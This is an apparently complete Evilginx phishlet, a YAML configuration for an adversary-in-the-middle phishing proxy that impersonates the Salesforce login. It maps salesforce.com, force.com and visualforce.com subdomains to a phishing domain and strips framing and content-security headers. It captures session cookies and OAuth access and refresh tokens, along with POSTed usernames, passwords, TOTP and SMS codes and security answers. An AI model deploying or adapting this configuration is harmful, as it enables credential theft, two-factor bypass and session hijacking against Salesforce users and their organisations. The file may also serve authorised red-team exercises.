min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://login.salesforce.com/'

proxy_hosts:
  - {phish_sub: 'login', orig_sub: 'login', domain: 'salesforce.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'my', orig_sub: 'my', domain: 'salesforce.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'test', orig_sub: 'test', domain: 'salesforce.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'api', orig_sub: 'api', domain: 'salesforce.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'www', orig_sub: 'www', domain: 'salesforce.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'c', orig_sub: 'c', domain: 'visualforce.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'ap1', orig_sub: 'ap1', domain: 'visualforce.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'na1', orig_sub: 'na1', domain: 'visualforce.com', session: true, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Salesforce domain URLs
  - {triggers_on: 'login.salesforce.com', orig_sub: 'login', domain: 'salesforce.com', search: 'https://login\\.salesforce\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'my', domain: 'salesforce.com', search: 'https://my\\.salesforce\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'test', domain: 'salesforce.com', search: 'https://test\\.salesforce\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'api', domain: 'salesforce.com', search: 'https://api\\.salesforce\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'www', domain: 'salesforce.com', search: 'https://www\\.salesforce\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'c', domain: 'visualforce.com', search: 'https://c\\.visualforce\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'ap1', domain: 'visualforce.com', search: 'https://ap1\\.visualforce\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'na1', domain: 'visualforce.com', search: 'https://na1\\.visualforce\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # Wildcard Salesforce instance domains
  - {triggers_on: 'login.salesforce.com', orig_sub: '*', domain: 'salesforce.com', search: 'https://([a-zA-Z0-9-]+)\\.salesforce\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'login.salesforce.com', orig_sub: '*', domain: 'force.com', search: 'https://([a-zA-Z0-9-]+)\\.force\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'login.salesforce.com', orig_sub: 'login', domain: 'salesforce.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'login', domain: 'salesforce.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'my', domain: 'salesforce.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'login.salesforce.com', orig_sub: 'my', domain: 'salesforce.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Salesforce authentication cookies
  - domain: '.salesforce.com'
    keys: ['sid', 'oid', 'sid_Client', 'sid_ClientOauth', 'BrowserId', 'BrowserId_sec']
    type: 'cookie'
  
  # Session and security cookies
  - domain: '.salesforce.com'
    keys: ['com.salesforce.visualforce.ViewState', 'com.salesforce.visualforce.ViewStateVersion', 'com.salesforce.visualforce.ViewStateMAC']
    type: 'cookie'
    optional: true
  
  # OAuth tokens
  - domain: '.salesforce.com'
    keys: ['oauth_token', 'oauth_token_secret', 'access_token', 'refresh_token']
    type: 'cookie'
    optional: true
  
  # Instance-specific cookies
  - domain: '.visualforce.com'
    keys: ['sid', 'oid', 'BrowserId']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'pw'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # 2FA codes
  totp_code:
    key: 'totp_code'
    search: '(.*)'
    type: 'post'
  
  # SMS codes
  sms_code:
    key: 'sms_code'
    search: '(.*)'
    type: 'post'
  
  # Security questions
  security_answer:
    key: 'security_answer'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '^/home'
  - '^/lightning'
  - '^/setup'
  - '^/apex'
  - '^/_ui/core/chatter/ui/ChatterPage'
  - '^/one/one.app'

login:
  domain: 'login.salesforce.com'
  path: '/'

